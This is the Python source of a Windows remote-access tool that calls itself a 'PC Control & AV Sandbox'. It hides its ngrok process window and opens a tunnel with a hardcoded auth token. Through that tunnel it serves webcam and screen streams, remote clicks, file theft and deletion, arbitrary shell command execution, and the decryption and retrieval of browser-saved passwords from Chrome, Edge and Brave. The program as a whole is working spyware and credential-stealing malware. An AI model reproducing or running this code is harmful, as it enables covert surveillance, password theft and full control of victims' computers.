import os
import sys
import time
import json
import io
import zipfile
import string
import subprocess
import threading
import sqlite3
import shutil
import base64
from datetime import datetime, timedelta
from ctypes import windll

# Auto-install dependencies if they are missing
def check_dependencies():
    if getattr(sys, 'frozen', False):
        return
    required_packages = {
        "flask": "flask",
        "psutil": "psutil",
        "Pillow": "PIL",
        "opencv-python": "cv2",
        "pyngrok": "pyngrok",
        "requests": "requests",
        "pycryptodome": "Crypto",
        "pywin32": "win32crypt"
    }
    for package, import_name in required_packages.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"[-] Missing library '{package}'. Attempting to install...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"[+] Successfully installed {package}")
            except Exception as e:
                print(f"[!] Failed to install {package}: {e}")

check_dependencies()

from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA1, SHA256
import win32crypt
from pathlib import Path

from pyngrok import ngrok, conf, process

# Hide ngrok process window completely on Windows
if sys.platform == 'win32':
    _original_start_process = process._start_process

    def _hidden_start_process(pyngrok_config):
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        
        _orig_popen = subprocess.Popen
        def _patched_popen(*args, **kwargs):
            kwargs['startupinfo'] = startupinfo
            kwargs['creationflags'] = kwargs.get('creationflags', 0) | subprocess.CREATE_NO_WINDOW
            return _orig_popen(*args, **kwargs)

        subprocess.Popen = _patched_popen
        try:
            return _original_start_process(pyngrok_config)
        finally:
            subprocess.Popen = _orig_popen

    process._start_process = _hidden_start_process

# Fix pyngrok stdout crash in GUI/noconsole mode when stdout is None
if getattr(sys, 'frozen', False) or sys.stdout is None:
    if sys.stdout is None:
        sys.stdout = open(os.devnull, 'w')
    if sys.stderr is None:
        sys.stderr = open(os.devnull, 'w')
    conf.get_default().log_event_callback = None
    conf.get_default().ngrok_path = os.path.join(os.path.expanduser("~"), ".ngrok2", "ngrok.exe")

ngrok.set_auth_token("3HGA44VnzU6g0d975LmMty178MX_RtUAMcyox98Takk1FAX9")

try:
    import cv2
except ImportError:
    cv2 = None

from flask import Flask, jsonify, request, send_file, Response, send_from_directory

from analyzer import (
    get_system_stats,
    get_processes,
    kill_process,
    execute_power_action,
    adjust_volume,
    capture_screen,
    click_at,
    get_screen_size
)

# Determine base directory path for PyInstaller or normal execution
if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(os.path.abspath(__file__))

static_folder_path = os.path.join(base_path, 'static')

# --- Configuration & Paths for Browser Credentials Extraction ---
BROWSERS = {
    "Chrome": {
        "path": os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Google", "Chrome", "User Data"),
        "profiles": ["Default"],
        "type": "chromium"
    },
    "Edge": {
        "path": os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Microsoft", "Edge", "User Data"),
        "profiles": ["Default"],
        "type": "chromium"
    },
    "Brave": {
        "path": os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
        "profiles": ["Default"],
        "type": "chromium"
    },
    "Firefox": {
        "path": os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles"),
        "profiles": [], # Dynamically detected
        "type": "firefox"
    }
}

def get_chrome_datetime(chrome_time):
    if chrome_time == 0: return None
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
    except Exception:
        return None

def get_chromium_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_chromium_password(blob, key):
    try:
        if blob.startswith(b'v10') or blob.startswith(b'v11'):
            iv = blob[3:15]
            payload = blob[15:-16]
            tag = blob[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode('utf-8')
        else:
            return str(win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1])
    except Exception:
        return ""

def extract_chromium(browser_name, base_path, profiles):
    passwords = []
    for profile in profiles:
        db_path = os.path.join(base_path, profile, "Login Data")
        state_path = os.path.join(base_path, "Local State")
        
        if not os.path.exists(db_path) or not os.path.exists(state_path):
            continue
        
        key = get_chromium_key(state_path)
        if not key:
            continue

        temp_db = os.path.join(os.environ.get("TEMP", ""), f"{browser_name}_{profile}_copy.db")
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            
            for url, user, pwd_blob, date in cursor.fetchall():
                if user or pwd_blob:
                    pwd = decrypt_chromium_password(pwd_blob, key)
                    if pwd or user:
                        dt = get_chrome_datetime(date)
                        passwords.append({
                            "browser": browser_name,
                            "url": url or "",
                            "user": user or "",
                            "pass": pwd or "",
                            "date": str(dt) if dt else ""
                        })
            conn.close()
        except Exception as e:
            print(f"[!] Error reading {browser_name}: {e}", flush=True)
        finally:
            if os.path.exists(temp_db): 
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
    return passwords

def extract_all_passwords():
    all_passwords = []
    
    # Extract Chromium-based
    for name, info in BROWSERS.items():
        if info["type"] == "chromium":
            try:
                passwords = extract_chromium(name, info["path"], info["profiles"])
                all_passwords.extend(passwords)
            except Exception as e:
                print(f"[!] Extraction failed for {name}: {e}", flush=True)
                
    # Save to passwords.json in the base path
    try:
        passwords_json_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.json")
        with open(passwords_json_path, "w", encoding="utf-8") as f:
            json.dump(all_passwords, f, indent=4)
    except Exception as e:
        print(f"[-] Error writing passwords.json: {e}", flush=True)
        
    return all_passwords

app = Flask(__name__, static_folder=static_folder_path, static_url_path='')

camera_thread = None
camera_running = False
latest_frame_bytes = None

screen_thread = None
screen_running = False
latest_screen_bytes = None
screen_lock = threading.Lock()

current_camera_index = 0
lock = threading.Lock()

active_viewers = 0
viewers_lock = threading.Lock()

def camera_producer():
    global latest_frame_bytes, camera_running
    print("[+] Camera producer thread started.", flush=True)
    cap = None
    while camera_running:
        if cv2 is None:
            time.sleep(1.0)
            continue
        
        start_time = time.time()
        with lock:
            target_index = current_camera_index
            
        if cap is None or not cap.isOpened():
            print(f"[*] Attempting to open camera at index {target_index}...", flush=True)
            cap = cv2.VideoCapture(target_index)
            if not cap.isOpened():
                print(f"[-] Camera {target_index} failed to open. Retrying in 5 seconds...", flush=True)
                time.sleep(5.0)
                continue
            print(f"[+] Camera {target_index} opened successfully.", flush=True)

        success, frame = cap.read()
        if not success:
            print("[-] cap.read() failed, releasing camera. Retrying in 5 seconds...", flush=True)
            time.sleep(5.0)
            if cap is not None:
                cap.release()
            cap = None
            continue
        
        try:
            h, w = frame.shape[:2]
            if w != 640 or h != 480:
                frame = cv2.resize(frame, (640, 480), interpolation=cv2.INTER_AREA)
        except Exception as e:
            print(f"[-] Resize failed: {e}", flush=True)
        
        ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
        if ret:
            with lock:
                latest_frame_bytes = buffer.tobytes()
        
        elapsed = time.time() - start_time
        sleep_time = max(0.04 - elapsed, 0.005)
        time.sleep(sleep_time)
        
    if cap is not None:
        cap.release()
    print("[-] Camera producer thread stopped.", flush=True)

def start_camera_thread():
    global camera_thread, camera_running
    with viewers_lock:
        if camera_thread is None or not camera_thread.is_alive():
            camera_running = True
            camera_thread = threading.Thread(target=camera_producer, daemon=True)
            camera_thread.start()

def release_camera():
    global camera_running, camera_thread, latest_frame_bytes
    camera_running = False
    if camera_thread and camera_thread.is_alive():
        camera_thread.join(timeout=2.0)
    camera_thread = None
    with lock:
        latest_frame_bytes = None

def screen_producer():
    global latest_screen_bytes, screen_running
    print("[+] Screen producer thread started.", flush=True)
    from PIL import ImageGrab
    while screen_running:
        start_time = time.time()
        try:
            img = ImageGrab.grab()
            img_io = io.BytesIO()
            img.save(img_io, 'JPEG', quality=60)
            frame_bytes = img_io.getvalue()
            with screen_lock:
                latest_screen_bytes = frame_bytes
        except Exception as e:
            print(f"[-] Screen grab thread failed: {e}", flush=True)
            time.sleep(1.0)
            continue
            
        elapsed = time.time() - start_time
        sleep_time = max(0.1 - elapsed, 0.01)
        time.sleep(sleep_time)
    print("[-] Screen producer thread stopped.", flush=True)

def start_screen_thread():
    global screen_thread, screen_running
    if screen_thread is None or not screen_thread.is_alive():
        screen_running = True
        screen_thread = threading.Thread(target=screen_producer, daemon=True)
        screen_thread.start()

def stop_screen_thread():
    global screen_running, screen_thread, latest_screen_bytes
    screen_running = False
    if screen_thread and screen_thread.is_alive():
        screen_thread.join(timeout=2.0)
    screen_thread = None
    with screen_lock:
        latest_screen_bytes = None

def get_placeholder_frame(message="Camera Offline"):
    try:
        import numpy as np
        img = np.zeros((480, 640, 3), dtype=np.uint8)
        cv2.putText(img, "NEBULA // AV Sandbox", (30, 50), cv2.FONT_HERSHEY_SIMPLEX, 0.6, (99, 102, 241), 2, cv2.LINE_AA)
        cv2.putText(img, message, (120, 240), cv2.FONT_HERSHEY_SIMPLEX, 0.9, (255, 255, 255), 2, cv2.LINE_AA)
        cv2.putText(img, "Select camera index or check if camera is locked.", (90, 290), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (139, 143, 158), 1, cv2.LINE_AA)
        ret, buffer = cv2.imencode('.jpg', img)
        if ret:
            return buffer.tobytes()
    except Exception:
        pass
    return None

def gen_frames():
    start_camera_thread()
    last_yielded = None
    while True:
        with lock:
            frame_bytes = latest_frame_bytes
        
        if frame_bytes:
            if frame_bytes != last_yielded:
                last_yielded = frame_bytes
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
            time.sleep(0.04)
        else:
            placeholder = get_placeholder_frame("Camera Offline / Loading...")
            if placeholder:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + placeholder + b'\r\n')
            time.sleep(0.5)

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(f"{letter}:\\")
        bitmask >>= 1
    return drives

@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/api/stats-stream')
def stats_stream():
    def generate():
        while True:
            try:
                stats = get_system_stats()
                yield f"data: {json.dumps(stats)}\n\n"
            except GeneratorExit:
                break
            except Exception as e:
                print(f"Error in stats stream generator: {e}")
                break
            time.sleep(1)
    return Response(generate(), mimetype='text/event-stream')

@app.route('/api/power', methods=['POST'])
def power_action():
    action = request.json.get('action')
    success = execute_power_action(action)
    return jsonify({'success': success})

@app.route('/api/volume', methods=['POST'])
def volume_action():
    action = request.json.get('action')
    success = adjust_volume(action)
    return jsonify({'success': success})

@app.route('/api/processes', methods=['GET'])
def list_processes_route():
    return jsonify({'processes': get_processes()})

@app.route('/api/processes/kill/<int:pid>', methods=['DELETE'])
def kill_process_route(pid):
    success = kill_process(pid)
    return jsonify({'success': success})

@app.route('/api/screenshot')
def screenshot_route():
    with screen_lock:
        bytes_data = latest_screen_bytes
    if bytes_data:
        return send_file(io.BytesIO(bytes_data), mimetype='image/jpeg', max_age=0)
    img_io = capture_screen()
    if img_io:
        return send_file(img_io, mimetype='image/jpeg', max_age=0)
    return 'Failed to capture screenshot', 500

@app.route('/api/screenshot/stream')
def screenshot_stream_route():
    def gen_screen_frames():
        last_yielded = None
        while True:
            with screen_lock:
                frame_bytes = latest_screen_bytes
            if frame_bytes:
                if frame_bytes != last_yielded:
                    last_yielded = frame_bytes
                    yield (b'--frame\r\n'
                           b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
                time.sleep(0.08)
            else:
                time.sleep(0.2)
    return Response(gen_screen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/api/screenshot/click', methods=['POST'])
def click_route():
    data = request.json or {}
    x = data.get('x')
    y = data.get('y')
    if x is None or y is None:
        return jsonify({'error': 'Missing coordinates'}), 400
    
    success = click_at(x, y)
    return jsonify({'success': success})

@app.route('/api/screen-size')
def screen_size_route():
    w, h = get_screen_size()
    return jsonify({'width': w, 'height': h})

@app.route('/api/files/list')
def list_files():
    path = request.args.get('path', '')
    if not path:
        drives = get_drives()
        items = [{
            'name': d,
            'is_dir': True,
            'path': d,
            'size': 0,
            'mtime': time.time()
        } for d in drives]
        return jsonify({
            'current_path': '',
            'is_root': True,
            'items': items
        })
    
    try:
        path = os.path.abspath(path)
        if not path.endswith('\\') and not path.endswith('/'):
            path += '\\'
            
        items = []
        for entry in os.scandir(path):
            try:
                stat = entry.stat()
                items.append({
                    'name': entry.name,
                    'is_dir': entry.is_dir(),
                    'path': entry.path,
                    'size': stat.st_size if entry.is_file() else 0,
                    'mtime': stat.st_mtime
                })
            except Exception:
                continue
                
        items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        return jsonify({
            'current_path': path,
            'is_root': False,
            'items': items
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/files/create', methods=['POST'])
def create_file_or_dir():
    data = request.json or {}
    parent_path = data.get('parent_path')
    name = data.get('name')
    item_type = data.get('type')
    
    if not parent_path or not name or not item_type:
        return jsonify({'error': 'Missing parameters'}), 400
        
    target_path = os.path.join(parent_path, name)
    try:
        if item_type == 'dir':
            os.makedirs(target_path, exist_ok=True)
        else:
            with open(target_path, 'w', encoding='utf-8') as f:
                pass
        return jsonify({'success': True, 'path': target_path})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/files/delete', methods=['POST'])
def delete_file_or_dir():
    data = request.json or {}
    paths = data.get('paths', [])
    
    if not paths:
        return jsonify({'error': 'No paths provided'}), 400
        
    results = []
    for path in paths:
        try:
            if os.path.isdir(path):
                shutil_rmtree_recursive(path)
            else:
                os.remove(path)
            results.append({'path': path, 'success': True})
        except Exception as e:
            results.append({'path': path, 'success': False, 'error': str(e)})
            
    return jsonify({'results': results})

def shutil_rmtree_recursive(path):
    import shutil
    def onerror(func, path, exc_info):
        import stat
        if not os.access(path, os.W_OK):
            os.chmod(path, stat.S_IWRITE)
            func(path)
        else:
            raise
    shutil.rmtree(path, onerror=onerror)

@app.route('/api/files/download')
def download_files():
    paths = request.args.getlist('paths')
    if not paths:
        return 'No paths specified', 400
        
    if len(paths) == 1:
        target = paths[0]
        if os.path.isfile(target):
            return send_file(target, as_attachment=True)
        elif os.path.isdir(target):
            memory_file = io.BytesIO()
            with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(target):
                    for file in files:
                        filepath = os.path.join(root, file)
                        arcname = os.path.relpath(filepath, os.path.dirname(target))
                        zf.write(filepath, arcname)
            memory_file.seek(0)
            folder_name = os.path.basename(os.path.normpath(target)) or 'folder'
            return send_file(
                memory_file,
                mimetype='application/zip',
                as_attachment=True,
                download_name=f"{folder_name}.zip"
            )
        else:
            return 'Path not found', 404
    else:
        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            for target in paths:
                if os.path.isfile(target):
                    zf.write(target, os.path.basename(target))
                elif os.path.isdir(target):
                    for root, dirs, files in os.walk(target):
                        for file in files:
                            filepath = os.path.join(root, file)
                            arcname = os.path.relpath(filepath, os.path.dirname(target))
                            zf.write(filepath, arcname)
        memory_file.seek(0)
        return send_file(
            memory_file,
            mimetype='application/zip',
            as_attachment=True,
            download_name="selected_files.zip"
        )

@app.route('/api/files/upload', methods=['POST'])
def upload_files():
    target_dir = request.form.get('path')
    if not target_dir or not os.path.isdir(target_dir):
        return jsonify({'error': 'Invalid target directory'}), 400
        
    files = request.files.getlist('files')
    if not files:
        return jsonify({'error': 'No files uploaded'}), 400
        
    uploaded = []
    for file in files:
        if file.filename:
            save_path = os.path.join(target_dir, file.filename)
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            file.save(save_path)
            uploaded.append(file.filename)
            
    return jsonify({'success': True, 'uploaded': uploaded})

@app.route('/api/terminal/execute', methods=['POST'])
def execute_command():
    data = request.json or {}
    command = data.get('command')
    cwd = data.get('cwd')
    
    if not command:
        return jsonify({'error': 'No command provided'}), 400
        
    if not cwd or not os.path.isdir(cwd):
        cwd = os.path.expanduser('~')
        
    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=15
        )
        return jsonify({
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        })
    except subprocess.TimeoutExpired as e:
        return jsonify({
            'stdout': e.stdout or '',
            'stderr': f"Command timed out after 15 seconds. {e.stderr or ''}",
            'returncode': -1
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/video_feed')
def video_feed():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/api/camera/snapshot')
def camera_snapshot():
    global current_camera_index, camera_running, latest_frame_bytes
    
    # If the camera thread is actively streaming, serve the latest frame immediately
    # to avoid resource lock collisions on Windows.
    with lock:
        if camera_running and latest_frame_bytes is not None:
            return send_file(io.BytesIO(latest_frame_bytes), mimetype='image/jpeg', max_age=0)
            
    if cv2 is None:
        return 'OpenCV not installed', 500
    
    with lock:
        target_index = current_camera_index
        
    print(f"[*] On-demand capture: opening camera {target_index}...", flush=True)
    cap = cv2.VideoCapture(target_index)
    if not cap.isOpened():
        print(f"[-] On-demand capture: failed to open camera {target_index}", flush=True)
        return 'Could not open camera', 500
    
    # Warm up camera to get stable exposure
    success = False
    frame = None
    for _ in range(5):
        success, frame = cap.read()
        if not success:
            break
        time.sleep(0.02)
        
    cap.release()
    print(f"[+] On-demand capture: camera {target_index} released", flush=True)
    
    if not success or frame is None:
        return 'Failed to capture frame from camera', 500
        
    try:
        h, w = frame.shape[:2]
        if w != 640 or h != 480:
            frame = cv2.resize(frame, (640, 480), interpolation=cv2.INTER_AREA)
    except Exception as e:
        print(f"[-] Resize failed: {e}", flush=True)
        
    ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
    if not ret:
        return 'Failed to encode image', 500
        
    return send_file(io.BytesIO(buffer.tobytes()), mimetype='image/jpeg', max_age=0)

@app.route('/api/camera/stream/stop', methods=['POST'])
def stop_camera_stream():
    print("[*] Stream stop requested. Releasing camera...", flush=True)
    release_camera()
    return jsonify({'success': True})

@app.route('/api/status')
def api_status():
    has_opencv = cv2 is not None
    return jsonify({
        'status': 'online',
        'camera_opened': has_opencv,
        'platform': sys.platform,
        'python_version': sys.version
    })

@app.route('/api/camera/switch', methods=['POST'])
def switch_camera_index():
    global current_camera_index
    try:
        new_index = int(request.args.get('index', 0))
        with lock:
            current_camera_index = new_index
        return jsonify({'success': True, 'current_index': new_index})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400

@app.route('/api/reset', methods=['POST'])
def api_reset():
    release_camera()
    return jsonify({'success': True})


@app.route('/api/passwords', methods=['GET'])
def get_passwords():
    passwords_json_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.json")
    if os.path.exists(passwords_json_path):
        try:
            with open(passwords_json_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                return jsonify(data)
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    return jsonify([])

@app.route('/api/passwords/extract', methods=['POST'])
def trigger_extraction():
    try:
        passwords = extract_all_passwords()
        return jsonify({"success": True, "passwords": passwords})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


if __name__ == '__main__':
    start_screen_thread()   

    http_tunnel = ngrok.connect(56756)

    print("Starting Combined PC Control & AV Sandbox Center on http://0.0.0.0:56756")
    try:
        is_frozen = getattr(sys, 'frozen', False)
        debug_mode = not is_frozen
        app.run(host='0.0.0.0', port=56756, debug=debug_mode, use_reloader=False)
    finally:
        release_camera()
        stop_screen_thread()

